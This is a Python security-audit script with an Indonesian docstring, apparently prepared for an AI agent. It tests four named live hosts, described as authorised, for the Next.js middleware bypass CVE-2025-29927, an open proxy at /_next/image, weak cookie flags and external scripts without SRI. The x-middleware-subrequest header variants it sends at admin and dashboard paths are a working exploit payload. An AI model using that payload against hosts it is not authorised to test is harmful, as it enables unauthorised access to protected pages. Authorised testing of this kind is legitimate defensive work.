"""Manual black-box pass (agent's own techniques, di luar engine Cyphron).

Target: hanya 4 host ter-otorisasi (AUTH doc pemilik, 443/80).
Teknik: (1) Next.js middleware bypass CVE-2025-29927 (3-gate diferensial),
(2) Next.js /_next/image open-proxy, (3) cookie flag audit anonim,
(4) skrip eksternal tanpa SRI. Semua bukti dicetak; tidak ada payload
merusak, tanpa eskalasi, rate-limit sopan.
"""

from __future__ import annotations

import http.client
import re
import ssl
import sys
import time
from urllib.parse import quote

RATE = 0.15
UA = "Mozilla/5.0 (compatible; ManualAudit/1.0)"


def req(host: str, path: str, headers: dict | None = None,
        method: str = "GET", timeout: float = 10.0):
    time.sleep(RATE)
    ctx = ssl.create_default_context()
    conn = http.client.HTTPSConnection(host, 443, timeout=timeout, context=ctx)
    h = {"User-Agent": UA, "Accept": "*/*"}
    h.update(headers or {})
    try:
        conn.request(method, path, headers=h)
        r = conn.getresponse()
        body = r.read(200_000).decode("utf-8", "replace")
        return r.status, dict(r.getheaders()), body
    except Exception as exc:
        return None, {}, f"__ERR__{type(exc).__name__}: {exc}"
    finally:
        conn.close()


def banner(t: str):
    print(f"\n=== {t} ===")


# ---------------------------------------------------------------- check 1
MW_VARIANTS = (
    "middleware",
    "middleware:middleware:middleware:middleware:middleware",
    "pages/_middleware",
    "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware",
)


def check_middleware_bypass(host: str, protected: list[str]):
    """3-gate: baseline tertahan; kontrol (header bogus) tetap tertahan;
    hanya varian asli x-middleware-subrequest yang membuka = temuan."""
    hits = []
    for path in protected:
        b_st, b_h, b_body = req(host, path)
        if b_st is None or b_st in (200,):
            continue  # path tidak terproteksi -> bukan target uji
        ctl_st, _ch, ctl_body = req(host, path, {"x-middleware-subrequest": "bogus:value"})
        if ctl_st != b_st:
            continue  # server bereaksi ke header sembarangan -> tidak dapat dinilai
        for variant in MW_VARIANTS:
            a_st, _ah, a_body = req(host, path, {"x-middleware-subrequest": variant})
            if a_st == 200 and a_body != b_body and len(a_body or "") > 200:
                hits.append((path, variant, b_st, a_st))
                break
    return hits


# ---------------------------------------------------------------- check 2
def check_next_image_proxy(host: str):
    """/_next/image mengambil URL eksternal = origin jadi content proxy.
    Gate: serangan 200 + content-type image/*, kontrol url sampah non-200."""
    ext = quote("https://www.google.com/favicon.ico", safe="")
    a_st, a_h, a_body = req(host, f"/_next/image?url={ext}&w=640&q=75")
    c_st, _ch, _cb = req(host, "/_next/image?url=%00invalid&w=640&q=75")
    ctype = (a_h.get("Content-Type") or a_h.get("content-type") or "")
    ok = a_st == 200 and ctype.startswith("image/") and c_st != 200
    return ok, a_st, ctype, c_st, len(a_body or "")


# ---------------------------------------------------------------- check 3
def check_cookies(host: str):
    issues = []
    for path in ("/", "/login"):
        _st, h, _b = req(host, path)
        raw = []
        for k, v in h.items():
            if k.lower() == "set-cookie":
                raw.append(v)
        for c in raw:
            name = c.split("=", 1)[0]
            low = c.lower()
            flags = []
            if "httponly" not in low:
                flags.append("HttpOnly-missing")
            if "secure" not in low:
                flags.append("Secure-missing")
            if "samesite" not in low:
                flags.append("SameSite-missing")
            if flags and "deleted" not in low and "expired" not in low:
                issues.append((path, name, flags))
    return issues


# ---------------------------------------------------------------- check 4
SRC_RE = re.compile(r"<script[^>]+src=[\"']([^\"']+)[\"'][^>]*>", re.I)


def check_sri(host: str):
    _st, _h, body = req(host, "/")
    external_no_sri = []
    for m in SRC_RE.finditer(body or ""):
        tag = m.group(0)
        src = m.group(1)
        if src.startswith("http") and host.split(":")[0] not in src:
            if "integrity=" not in tag:
                external_no_sri.append(src)
    return external_no_sri


def main(target: str, protected: list[str]):
    host = target.replace("https://", "").replace("http://", "")
    banner(f"{target}")
    st, _h, _b = req(host, "/")
    print(f"entrypoint: {st}")

    banner("1. Next.js middleware bypass (CVE-2025-29927)")
    hits = check_middleware_bypass(host, protected)
    print(" TEMUAN (bypass terkonfirmasi):" if hits else " TIDAK DITEMUKAN (semua varian tertahan)")
    for p, v, bs, as_ in hits:
        print(f"  path={p} variant={v!r} baseline={bs} -> attack={as_}")

    banner("2. /_next/image open-proxy")
    ok, a_st, ctype, c_st, n = check_next_image_proxy(host)
    if ok:
        print(f" TEMUAN: proxy eksternal 200 content-type={ctype} bytes={n} (kontrol {c_st})")
    else:
        print(f" TIDAK DITEMUKAN (attack={a_st} ctype={ctype!r} kontrol={c_st})")

    banner("3. Cookie flags (anonim)")
    issues = check_cookies(host)
    print(" TEMUAN:" if issues else " TIDAK DITEMUKAN (semua flag lengkap / tanpa cookie)")
    for p, name, flags in issues:
        print(f"  {p} cookie={name!r} {','.join(flags)}")

    banner("4. Skrip eksternal tanpa SRI")
    no_sri = check_sri(host)
    print(f" TIDAK DITEMUKAN" if not no_sri else " TEMUAN (postur):")
    for src in no_sri[:8]:
        print(f"  {src}")


if __name__ == "__main__":
    jobs = [
        ("https://airon.astheron.my.id", ["/dashboard", "/admin", "/profile", "/settings"]),
        ("https://aron.iliterate.ai", ["/admin", "/dashboard", "/profile", "/settings"]),
        ("https://hoplite.astheron.my.id", ["/dashboard", "/admin", "/app", "/scan"]),
        ("https://astheron.my.id", ["/dashboard", "/admin", "/app", "/panel"]),
    ]
    if len(sys.argv) > 1:
        jobs = [(sys.argv[1], ["/dashboard", "/admin", "/profile", "/settings"])]
    for tgt, prot in jobs:
        main(tgt, prot)
